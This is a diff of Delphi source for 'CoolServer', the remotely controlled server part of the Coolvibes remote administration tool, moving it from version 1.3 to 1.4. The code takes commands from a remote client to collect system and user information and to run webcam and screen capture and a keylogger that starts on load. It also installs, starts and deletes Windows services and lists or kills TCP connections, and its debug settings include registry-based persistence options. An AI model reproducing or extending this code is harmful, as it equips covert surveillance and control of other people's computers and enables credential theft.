@@ -12,8 +12,8 @@
 
      El equipo Coolvibes
 *)
-library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
-//program CoolServer; //Para debug, más lineas "Para debug" abajo
+//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
+program CoolServer; //Para debug, más lineas "Para debug" abajo
 uses
   Windows,
   SysUtils,
@@ -31,7 +31,6 @@ uses
   UnitRegistro,
   MiniReg,
   UnitVariables,
-  //unitCapScreen,  
   unitCamScreen, //Webcam
   unitAvs,
   UnitCambioId,
@@ -44,6 +43,7 @@ uses
   UnitBuscar,
   UnitThreadsCapCamCapture,//unit que se encarga de gestionar el envio de captura de pantalla, de thumbnails, de keylogger y de webcam en un thread independiente
   UnitAudio,
+  UnitPortScan,
   UnitTransfer;
 
 var
@@ -162,6 +162,7 @@ const
     Tam: int64;
     ShellParameters: TShellParameters;
     ThreadInfo: TThreadInfo;
+    ThreadSInfo: TThreadServiciosInfo;
     FilePath, LocalFilePath: ansistring;
     Host  :string;
     Port : integer;
@@ -169,6 +170,7 @@ const
     ThreadCapCam : TThreadCapCam;
     capiniciada : boolean;
     MS : Tmemorystream;
+    ExitCode: longword;
   begin
     try
       begin
@@ -217,8 +219,8 @@ const
             Respuesta :=
               LeerID() + '|'+ Sock.LocalAddress + '|' + GetCPU() + '|' +
               GetOS() + '|' + VersionDelServer + '|1|'+GetActiveWindowCaption()+'|'+
-               GetIdleTime()+ '|'+GetUptime()+'|'+GetIdioma()+'|';
-
+               GetIdleTime()+ '|'+GetUptime()+'|'+GetIdioma()+'|'+GetPcUser()+'/'+GetPCName()+'|';
+                                                                        {no cambiar este slash}
             SendText('MAININFO|' + Respuesta + ENTER);
           end;
 
@@ -232,7 +234,7 @@ const
               '|' + GetResolucion() + '|' + GetTamanioDiscos() + '|';
             SendText('INFO|' + Respuesta + ENTER);
           end;
-
+            
           //Comandos relacionados con la gestión del servidor
           if Copy(Recibido, 1, 8) = 'SERVIDOR' then
           begin
@@ -790,7 +792,7 @@ const
             if Pararcapturathread then   //si aun no se ha iniciado...
             begin
               pararcapturathread := false;
-              ThreadCapCam := TThreadCapCam.Create(host,inttostr(port),inttostr(SH)); //Se crea nuevo thread
+              ThreadCapCam := TThreadCapCam.Create(SH, sock); //Se crea nuevo thread
               ThreadCapCam.Resume;
             end;
                     //El thread mira el cambio de la variable global CapturaPantalla,CapturaWebcam..., quizas no sea el mejor método...
@@ -981,38 +983,82 @@ const
             Tempstr := ServiceList;
             SendText('SERVICIOSWIN' + '|' + TempStr + ENTER);
           end;
-          
+
+
+          //A partir de la versión 1.2 estos comandos son ejecutados en otro thread diferente porque causaban que el thread de la conexión se congelara
+
           if Pos('INICIARSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 15);
-            ServiceStatus(Recibido, True, True);
-            SendText('MSG|{47}' + ENTER);
+            ThreadSInfo := TThreadServiciosInfo.Create;
+            ThreadSInfo.tipo := 0;
+            ThreadSInfo.sService := Recibido;
+            ThreadSInfo.Change    := True;
+            ThreadSInfo.StartStop := True;
+            BeginThread(nil,
+              0,
+              Addr(ThreadServicios),
+              ThreadSInfo,
+              0,
+              ThreadSInfo.ThreadId);
+              
+            //ServiceStatus(Recibido, True, True);
+              SendText('MSG|{47}' + ENTER);
           end;
 
           if Pos('DETENERSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 15);
-            ServiceStatus(Recibido, True, False);
-            SendText('MSG|{48}' + ENTER);
+            ThreadSInfo := TThreadServiciosInfo.Create;
+            ThreadSInfo.tipo := 0;
+            ThreadSInfo.sService := Recibido;
+            ThreadSInfo.Change    := True;
+            ThreadSInfo.StartStop := False;
+            BeginThread(nil,
+              0,
+              Addr(ThreadServicios),
+              ThreadSInfo,
+              0,
+              ThreadSInfo.ThreadId);
+              SendText('MSG|{48}' + ENTER);
+
           end;
 
           if Pos('BORRARSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 14);
-            ServicioBorrar(Recibido);
-            SendText('MSG|{49}' + ENTER);
+            ThreadSInfo := TThreadServiciosInfo.Create;
+            ThreadSInfo.tipo := 1;//Borrar servicio
+            ThreadSInfo.sService := Recibido;
+            BeginThread(nil,
+              0,
+              Addr(ThreadServicios),
+              ThreadSInfo,
+              0,
+              ThreadSInfo.ThreadId);
+            //ServiceStatus(Recibido, True, False);
+
+              SendText('MSG|{49}' + ENTER);
           end;
 
           if Pos('INSTALARSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 16);
-            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+            ThreadSInfo := TThreadServiciosInfo.Create;
+            ThreadSInfo.tipo := 2;//Instalar servicio
+            ThreadSInfo.sService := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             Delete(Recibido, 1, Pos('|', Recibido));
-            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+            ThreadSInfo.sDisplay := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             Delete(Recibido, 1, Pos('|', Recibido));
-            TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+            ThreadSInfo.sPath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             //prueba//messageBox(0,pchar(tempstr+'|'+tempstr1+'|'+tempstr2),0,0);
-            ServicioCrear(TempStr, TempStr1, TempStr2);
+            BeginThread(nil,
+              0,
+              Addr(ThreadServicios),
+              ThreadSInfo,
+              0,
+              ThreadSInfo.ThreadId);
+            //ServicioCrear(TempStr, TempStr1, TempStr2);
             SendText('MSG|{50}' + ENTER);
           end;
 
@@ -1104,7 +1150,24 @@ const
             TempStr := DispositivosDeAudio;
             sendtext('GETADRIVERS|'+Tempstr+ENTER);
           end;
+          //Comandos Relacionados con el PortScant
+          if Copy(Recibido, 1, 6) = 'TCPUDP' then
+          begin
+            delete (recibido,1,7);//Borramos TCPUDP|
+            if recibido = 'FALSE' then //información simple
+              SendText('TCPUDP'+DumpTCP(false,false,'')+DumpUdp(false,false,'')+'|'+ENTER)
+            else  //información compuesta
+              SendText('TCPUDP'+DumpTCP(true,false,'') +DumpUDP(true,false,'')+'|'+ENTER);
+          end;
 
+          if Pos('TCPKILLCON', Recibido) = 1 then
+          begin
+            Delete(Recibido,1,11);
+            DumpTCP(true,true,recibido);
+            SendText('MSG|{55}' + ENTER);
+          end;
+
+    // fin de comandos relacionados con el port escaner;
           lastCommandTime := getTickCount;
           Busy := False;
         end;//while sock.connected do
@@ -1136,7 +1199,7 @@ const
   procedure CargarServidor(P:Pointer);
   begin
     Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-    VersionDelServer := '1.3';
+    VersionDelServer := '1.4';
     BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
     OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   
@@ -1151,7 +1214,7 @@ const
 
 begin
     //Para debug:
-    {Configuracion.sHosts                 := 'localhost:77¬';
+    Configuracion.sHosts                 := 'localhost:77¬';
     Configuracion.sID                     := 'Coolserver';
     Configuracion.bCopiarArchivo          := False; //Me copio o no?
     Configuracion.sFileNameToCopy         := 'coolserver.exe';
@@ -1162,6 +1225,6 @@ begin
     Configuracion.sRunRegKeyName          := 'Coolserver';
     Configuracion.bArranqueActiveSetup    := False;
     Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
-    CargarServidor(@configuracion);  
-    }//Fin de Para debug
+    CargarServidor(@configuracion);
+    //Fin de Para debug
 end.
